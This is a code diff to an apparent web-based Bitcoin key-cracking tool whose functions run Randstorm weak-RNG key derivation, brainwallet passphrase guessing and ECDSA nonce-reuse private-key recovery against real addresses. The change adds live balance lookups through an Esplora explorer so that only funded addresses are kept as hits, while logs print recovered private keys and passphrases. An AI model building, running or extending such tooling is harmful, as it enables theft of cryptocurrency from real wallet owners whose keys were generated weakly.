@@ -136,6 +136,14 @@ NONCE_RETRY_FILE         = "nonce_retry.txt"
 BLOOM_FP_RATE = min(0.5, max(1e-12, _env_float("BLOOM_FP_RATE", 1e-6)))
 # Cap on unique addresses checked by one /api/verify run.
 VERIFY_MAX_ADDRESSES = _env_int("VERIFY_MAX_ADDRESSES", 5000, 1)
+# Live-verify every Bloom candidate as it is found. Adds one paced Esplora
+# request per candidate, but stops 0-BTC false positives reaching /results.
+# Set 0 for the old "save candidate, verify later" mode.
+AUTO_VERIFY_HITS = os.environ.get(
+    "AUTO_VERIFY_HITS", "1").strip().lower() not in ("0", "false", "no", "off")
+# Minimum combined chain+mempool sats required to save a hit. Default 1 skips
+# zero-balance candidates; 0 keeps them with balance fields attached.
+AUTO_VERIFY_MIN_SATS = _env_int("AUTO_VERIFY_MIN_SATS", 1, 0)
 PORT       = int(os.environ.get("PORT", 5000))
 GENESIS_TS = 1293840000000  # 2011-01-01 ms
 CUTOFF_TS  = 1420070400000  # 2015-01-01 ms
@@ -870,10 +878,10 @@ def _bitcoinjs_securerandom(seed_ms):
     return _rc4_bytes(S, 32)
 
 def attack_randstorm(start_ms, end_ms, bf, log, job):
-    """Iterate timestamp range, derive keys, check bloom."""
+    """Iterate timestamp range, derive keys, live-check bloom candidates."""
     total = end_ms - start_ms + 1
     log(f"[randstorm] {start_ms}..{end_ms}  ({total:,} timestamps)")
-    hits = []; t0 = time.time()
+    hits = []; skipped = 0; t0 = time.time()
     for i, ts in enumerate(range(start_ms, end_ms + 1)):
         if job["stop"]: log("[randstorm] stopped"); break
         try:
@@ -884,16 +892,26 @@ def attack_randstorm(start_ms, end_ms, bf, log, job):
                 if h and h in bf:
                     hit = {"ts": ts, "privkey": hex(pk), "address": addr,
                            "type": label, "found_at": datetime.now(timezone.utc).isoformat()}
+                    save, hit, note = _balance_gate(
+                        hit, log, job, lambda: job["stop"])
+                    if not save:
+                        if note == "stopped":
+                            log("[randstorm] stopped")
+                            return hits
+                        skipped += 1
+                        continue
                     hits.append(hit)
-                    log(f"  ★★★ HIT {addr}  privkey={hex(pk)}  ts={ts}")
+                    log(f"  ★★★ HIT {addr}  privkey={hex(pk)}  ts={ts}  {note}")
                     _save_result("randstorm", hit)
         except Exception:
             pass
         if i % 500 == 0:
             rate = (i + 1) / max(time.time() - t0, 0.001)
             job["progress"] = (i + 1) / total
-            job["detail"] = f"{i+1:,}/{total:,}  {rate:.0f} ts/s  hits={len(hits)}"
-    log(f"[randstorm] done — {len(hits)} hits")
+            job["detail"] = (f"{i+1:,}/{total:,}  {rate:.0f} ts/s  "
+                             f"hits={len(hits)}  skipped={skipped}")
+    log(f"[randstorm] done — {len(hits)} hits, "
+        f"{skipped} zero-balance candidate(s) skipped")
     return hits
 
 
@@ -901,7 +919,7 @@ def attack_randstorm(start_ms, end_ms, bf, log, job):
 # ATTACK 2 — BRAINWALLET
 # ════════════════════════════════════════════════════════════════════
 def attack_brainwallet(passphrases, bf, log, job):
-    hits = []; total = len(passphrases); t0 = time.time()
+    hits = []; skipped = 0; total = len(passphrases); t0 = time.time()
     log(f"[brain] {total:,} passphrases")
     for i, pw in enumerate(passphrases):
         if job["stop"]: break
@@ -914,15 +932,25 @@ def attack_brainwallet(passphrases, bf, log, job):
                     hit = {"passphrase": pw, "privkey": hex(pk),
                            "address": addr, "type": label,
                            "found_at": datetime.now(timezone.utc).isoformat()}
+                    save, hit, note = _balance_gate(
+                        hit, log, job, lambda: job["stop"])
+                    if not save:
+                        if note == "stopped":
+                            log("[brain] stopped")
+                            return hits
+                        skipped += 1
+                        continue
                     hits.append(hit); _save_result("brainwallet", hit)
-                    log(f"  ★★★ HIT {addr}  pw={pw!r}")
+                    log(f"  ★★★ HIT {addr}  pw={pw!r}  {note}")
         except Exception:
             pass
         if i % 200 == 0:
             rate = (i + 1) / max(time.time() - t0, 0.001)
             job["progress"] = (i + 1) / total
-            job["detail"] = f"{i+1:,}/{total:,}  {rate:.0f} pw/s  hits={len(hits)}"
-    log(f"[brain] done — {len(hits)} hits")
+            job["detail"] = (f"{i+1:,}/{total:,}  {rate:.0f} pw/s  "
+                             f"hits={len(hits)}  skipped={skipped}")
+    log(f"[brain] done — {len(hits)} hits, "
+        f"{skipped} zero-balance candidate(s) skipped")
     return hits
 
 
@@ -1269,9 +1297,17 @@ def attack_nonce_reuse(address, log, job, should_stop=None, prefix=""):
                            "matches_target": addr == address,
                            "r": hex(r), "txids": [group[a]['txid'], group[b]['txid']],
                            "found_at": datetime.now(timezone.utc).isoformat()}
+                    save, hit, note = _balance_gate(
+                        hit, log, job, stop, prefix)
+                    if not save:
+                        if note == "stopped":
+                            log(f"{prefix}[nonce] stopped by user")
+                            return hits
+                        continue
                     hits.append(hit); _save_result("nonce", hit)
-                    log(f"{prefix}  ★★★ KEY {hex(d)}  {addr}")
-    log(f"{prefix}[nonce] done — {len(hits)} hits")
+                    log(f"{prefix}  ★★★ KEY {hex(d)}  {addr}  {note}")
+    log(f"{prefix}[nonce] done — {len(hits)} hits, "
+        f"{job.get('auto_verify_skipped', 0):,} zero-balance candidate(s) skipped")
     return hits
 
 
@@ -1320,6 +1356,7 @@ def attack_nonce_reuse_bulk(addresses, log, job):
         job["progress"] = done / total
         job["detail"] = (f"{done:,}/{total:,} addresses  "
                          f"hits={len(all_hits):,}  unchecked={len(failed):,}  "
+                         f"skipped={job.get('auto_verify_skipped', 0):,}  "
                          f"{rate:.2f} addr/s  eta ~{eta/60:.1f} min")
 
     if failed and not job["stop"]:
@@ -1357,7 +1394,8 @@ def attack_nonce_reuse_bulk(addresses, log, job):
         log(f"[nonce] {len(failed):,} address(es) still unchecked — "
             f"saved to {saved}")
     log(f"[nonce] bulk done — {len(all_hits):,} hits over "
-        f"{checked:,}/{total:,} address(es) checked")
+        f"{checked:,}/{total:,} address(es) checked "
+        f"({job.get('auto_verify_skipped', 0):,} zero-balance candidates skipped)")
     return all_hits
 
 
@@ -1465,6 +1503,74 @@ def _balance_badge(addr, checks):
                 'likely Bloom false positive</span>')
     return '<span class="badge bad">0 BTC · spent / empty</span>'
 
+def _live_balance(addr, should_stop=None):
+    """One live Esplora balance lookup for a Bloom candidate."""
+    txt = _esplora_get(f"/address/{addr}", should_stop)
+    d = json.loads(txt)
+    chain = d.get("chain_stats") or {}
+    mem = d.get("mempool_stats") or {}
+    sats = int(chain.get("funded_txo_sum", 0)) - int(chain.get("spent_txo_sum", 0))
+    msats = int(mem.get("funded_txo_sum", 0)) - int(mem.get("spent_txo_sum", 0))
+    tx_count = int(chain.get("tx_count", 0))
+    return {"sats": sats, "mempool_sats": msats, "tx_count": tx_count,
+            "checked_at": datetime.now(timezone.utc).isoformat(timespec="seconds")}
+
+
+def _balance_gate(hit, log, job, should_stop=None, prefix=""):
+    """Live-check a Bloom candidate before it is saved or logged as a hit.
+
+    Returns (save, enriched_hit, note). Zero-balance candidates are skipped by
+    default; explorer failures are saved with balance_error, never dropped.
+    """
+    if not AUTO_VERIFY_HITS:
+        return True, hit, "candidate (auto-verify off)"
+    addr = hit.get("address") or hit.get("recovered_addr")
+    if not isinstance(addr, str):
+        return True, hit, "no address — saved as candidate"
+    addr = _normalise_address(addr)
+    if not _valid_address(addr):
+        return True, hit, "invalid address — saved as candidate"
+    stop = should_stop or (lambda: job.get("stop", False))
+    try:
+        b = _live_balance(addr, stop)
+    except RuntimeError as e:
+        if "stopped by user" in str(e):
+            log(f"{prefix}[auto-verify] stopped by user")
+            return False, hit, "stopped"
+        err = str(e)
+    except Exception as e:
+        err = str(e)
+    else:
+        _store_balance_check(addr, b["sats"], b["tx_count"], b["mempool_sats"])
+        total = b["sats"] + b["mempool_sats"]
+        verdict = ("funded_verify_manually" if total > 0 else
+                   "never_funded_likely_false_positive" if b["tx_count"] == 0 else
+                   "empty_or_spent")
+        enriched = {**hit,
+                    "balance_sats": total,
+                    "balance_tx_count": b["tx_count"],
+                    "balance_checked_at": b["checked_at"],
+                    "balance_error": "",
+                    "balance_verdict": verdict}
+        if total >= AUTO_VERIFY_MIN_SATS:
+            return True, enriched, (
+                f"balance={total / 1e8:.8f} BTC · tx_count={b['tx_count']:,} · "
+                "verify manually")
+        job["auto_verify_skipped"] = job.get("auto_verify_skipped", 0) + 1
+        why = "never funded" if b["tx_count"] == 0 else "spent / empty"
+        log(f"{prefix}[-] skipped {addr}: 0 BTC · {why} "
+            "(Bloom false positive)")
+        return False, enriched, ""
+    _store_balance_check(addr, 0, 0, 0, err)
+    enriched = {**hit, "balance_sats": None, "balance_tx_count": 0,
+                "balance_checked_at":
+                    datetime.now(timezone.utc).isoformat(timespec="seconds"),
+                "balance_error": str(err)[:200],
+                "balance_verdict": "check_failed"}
+    log(f"{prefix}[!] balance check failed for {addr}: {err} — saved as candidate")
+    return True, enriched, "balance check failed — verify manually"
+
+
 def verify_result_balances(force, log, job):
     """Check saved hits against Esplora. Paced, cached, stoppable."""
     if force:
@@ -1544,6 +1650,7 @@ def _start_job(name, fn, *args):
         job = {"progress": 0.0, "detail": "starting…", "alive": True,
                "stop": False, "log": [], "log_total": 0, "error": "",
                "killed": False, "resetting": False,
+               "auto_verify_skipped": 0,
                "started": datetime.now(timezone.utc).isoformat()}
         _JOBS[name] = job
     _sync_busy()
@@ -1973,7 +2080,9 @@ def rs_page():
 <input id="e" value="1293840001000">
 <p class="muted">2011-01-01 → 2015-01-01 is the vulnerable window, but that is
 126 billion timestamps and would take months. The default here is a 1,000 ms
-smoke test; raise it in small chunks (max 5,000,000 ms per run).</p>
+smoke test; raise it in small chunks (max 5,000,000 ms per run). Bloom
+candidates are live-checked for balance as found; zero-balance addresses are
+skipped by default.</p>
 <button class="btn" onclick="start()">Start</button>
 <button class="btn danger" onclick="stop('randstorm')">Stop</button>
 </div>
@@ -2156,11 +2265,14 @@ def results_page():
     rows = _list_results()
     checks = _balance_checks()
     body = "<div class='card'><h2>Results</h2>"
-    body += ("<p class='muted'>Hits are Bloom-filter candidates from a dated "
-             "snapshot, not confirmed wallets. Check balances before trusting "
-             "any hit: a zero-balance address with no transactions is almost "
-             "certainly a Bloom false positive. Even a funded hit still needs "
-             "manual verification with a block explorer.</p>")
+    body += ("<p class='muted'>Hits are live-checked against Esplora as they "
+             "are found. Zero-balance candidates are skipped by default and "
+             "never reach this page; saved hits include balance fields. "
+             "A Bloom hit is still only a candidate from a dated snapshot — "
+             "even a funded hit needs manual verification with a block "
+             "explorer. Use Check balances / Force re-check below to refresh "
+             "stored balances. Set AUTO_VERIFY_HITS=0 for the old "
+             "save-candidate-first behaviour.</p>")
     body += ("<p><a class='btn' href='/api/results/export'>Download all (JSONL)</a>"
              "<a class='btn' href='/api/results/export?attack=nonce'>"
              "Download nonce results (JSONL)</a></p>"
@@ -2172,9 +2284,10 @@ def results_page():
              "<button class='btn' onclick=\"verifyBalances(true)\">"
              "Force re-check</button>"
              "<button class='btn danger' onclick=\"stop('verify')\">Stop</button>"
-             f"<p class='muted'>Queries {html.escape(ESPLORA)} for every saved "
-             "hit address, paced by ESPLORA_MIN_INTERVAL and cached per "
-             "process. Force re-check clears that cache. "
+             f"<p class='muted'>New hits are already checked live. This re-checks "
+             f"saved hit addresses against {html.escape(ESPLORA)}, paced by "
+             "ESPLORA_MIN_INTERVAL and cached per process. Force re-check "
+             "clears that cache. "
              f"Max {VERIFY_MAX_ADDRESSES:,} unique addresses per run.</p>"
              "<div class='bar'><div id='bar' style='width:0%'></div></div>"
              "<p id='detail' class='muted'></p><pre id='log'></pre></div>")
